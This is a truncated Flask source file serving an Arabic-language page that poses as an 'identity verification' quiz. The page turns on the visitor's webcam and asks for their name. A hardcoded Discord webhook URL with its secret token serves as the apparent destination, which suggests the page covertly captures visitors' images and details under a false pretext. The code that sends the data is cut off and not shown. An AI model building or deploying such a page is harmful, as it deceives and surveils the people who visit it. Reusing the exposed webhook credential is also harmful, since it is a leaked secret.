import os
import json
import requests
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

DISCORD_WEBHOOK_URL = os.getenv(
    "DISCORD_WEBHOOK_URL",
    "https://discord.com/api/webhooks/1558192127085781025/wUzlyTNtQbjoWz6aTgsE_YAKXj14XYo-gs7C6f25QBfqr_LqWUZQBQ97bUKdZsJ69X-E"
)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديد الهوية والأسئلة</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f6f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .card { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; max-width: 480px; width: 100%; }
        h2 { color: #333; margin-bottom: 10px; }
        
        .title-banner {
            background-color: #ff4757;
            color: white;
            padding: 10px;
            border-radius: 6px;
            margin-bottom: 15px;
            font-size: 18px;
            font-weight: bold;
        }

        #video-container { margin: 15px 0; }
        video { width: 100%; border-radius: 8px; background: #000; border: 2px solid #ddd; }
        .question-box { margin-bottom: 15px; text-align: right; background: #f1f2f6; padding: 10px; border-radius: 5px; }
        .question-box label { display: block; font-weight: bold; margin-bottom: 5px; color: #333; }
        .question-box input, .question-box select { width: 100%; padding: 8px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; }
        
        button { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 15px; width: 100%; background-color: #2ed573; color: white; }
        #status { margin-top: 15px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <div class="title-banner">TJEWEB T9OSS</div>
        <h2>تحقق من الهوية</h2>

        <div id="video-container">
            <video id="webcam" autoplay playsinline muted></video>
        </div>
        
        <form id="quizForm">
            <input type="text" id="username" placeholder="اسمك الكريم (Name)" required style="width: 100%; padding: 10px; margin-bottom: 15px; font-size: 14px; box-sizing: border-box;"><br>
            
            <div class="question-box">
                <label>1. I'M MORE BEAUTIFUL THAN YOU</label>
                <select id="q1" required>
                    <option value="">اختر الإجابة</option>
                    <option value="yes">Yes
